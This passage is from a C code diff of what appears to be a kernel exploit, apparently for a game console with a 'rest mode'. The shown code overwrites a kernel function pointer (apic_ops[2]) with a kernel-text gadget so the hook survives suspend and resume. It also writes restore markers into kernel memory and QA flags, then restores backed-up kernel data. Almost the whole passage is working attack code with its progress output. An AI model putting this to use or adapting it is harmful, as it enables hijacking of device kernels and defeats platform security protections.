+            printf("    apic_ops[2] = 0x%016lx [%s]\n",
+                   (unsigned long)p9_armed_verify,
+                   p9_armed_ok ? "ARMED" : "MISMATCH");
+
+            if (p9_armed_ok) {
+                printf("\n[+] ============================================\n");
+                printf("[+]  APIC_OPS[2] ARMED WITH KTEXT GADGET!\n");
+                printf("[+] ============================================\n");
+                printf("[+]  apic_ops[2] → 0x%016lx (ktext)\n",
+                       (unsigned long)p9_gadget_addr);
+                printf("[+]  Returns 1 = APIC_MODE_XAPIC\n");
+                printf("[+]  SAFE DURING SUSPEND: ktext is always executable\n");
+                printf("[+]\n");
+                printf("[+]  This hook will SURVIVE suspend/resume because:\n");
+                printf("[+]    1. apic_ops[2] value persists in kdata (confirmed)\n");
+                printf("[+]    2. Target is in ktext (NPT always allows X)\n");
+                printf("[+]    3. No kdata execution needed (unlike previous attempts)\n");
+
+                /* Save original xapic to cave marker for post-resume restore */
+                uint64_t cave_pa9 = va_to_pa_quiet(g_kdata_base);
+                if (cave_pa9) {
+                    uint8_t cave9[P7_MARKER_SIZE];
+                    memset(cave9, 0, sizeof(cave9));
+                    uint64_t magic9 = P7_CAVE_MAGIC;
+                    memcpy(&cave9[0x00], &magic9, 8);
+                    memcpy(&cave9[0x08], &p9_orig_xapic, 8);
+                    memcpy(&cave9[0x10], &g_ktext_base, 8);
+                    kernel_copyin(cave9, g_dmap_base + cave_pa9, P7_MARKER_SIZE);
+                    printf("[+]  Cave marker saved (original xapic for restore).\n");
+                }
+
+                /* Store in QA flags too */
+                uint8_t qa9[16];
+                kernel_get_qaflags(qa9);
+                qa9[0] = 0xFF; qa9[1] = 0xFF;
+                uint32_t marker9 = PHASE7_MARKER;
+                memcpy(&qa9[4], &marker9, 4);
+                memcpy(&qa9[8], &p9_orig_xapic, 8);
+                kernel_set_qaflags(qa9);
+                printf("[+]  QA flags saved with original xapic.\n");
+
+                printf("[+]\n");
+                printf("[+]  READY FOR SUSPEND TEST.\n");
+                printf("[+]  Enter rest mode — the ktext gadget should survive!\n");
+            }
+        } else {
+            printf("\n[-] Could not identify gadget from trace.\n");
+            printf("    xapic_mode return value: %u\n", p9_retval);
+            printf("    Manual analysis of trace may be needed.\n");
+        }
+
+        /* Restore kdata content */
+        kernel_copyin(p9_backup_db, db_handler_dmap, sizeof(p9_backup_db));
+        kernel_copyin(p9_backup_launcher, launcher_dmap, sizeof(p9_backup_launcher));
+        kernel_copyin(p9_backup_trace, trace_buf_dmap, sizeof(p9_backup_trace));
+        printf("\n[*] kdata content restored.\n");
+
+        printf("\n");
+        fflush(stdout);
+
         return;
     }
 
